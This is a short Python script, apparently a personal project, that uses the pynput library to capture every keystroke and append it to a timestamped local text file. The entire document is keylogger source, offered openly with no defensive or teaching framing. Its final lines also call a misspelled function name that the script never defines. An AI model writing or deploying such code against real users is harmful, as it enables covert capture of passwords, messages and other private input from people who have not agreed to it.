import datetime
from pynput.keyboard import Key, Listener
#require pynput --> pip install pynput


d= datetime.datetime.now() .strftime('%Y-%m-%d_%H-%M-%S')

def key_recoder (key):
    key=str(key)
    f= open('Proyectos\Keylogger\keyloger_ {}.txt'.format(d), 'a')
    if key == 'Key.enter':
     f.write('\n')
    elif  key == 'Key.space':
     f.write(' ')
    elif  key == 'Key.backspace':
     f.write('%BORRAR%')
    elif key == 'Key.caps_lock':
        f.write('Mayusculas--> ')
        
    else:
        f.write(key.replace("'","")) 

with Listener(on_press=key_recoder) as l:
     l.join()


if __name__=='__main__':
    key_recorder()
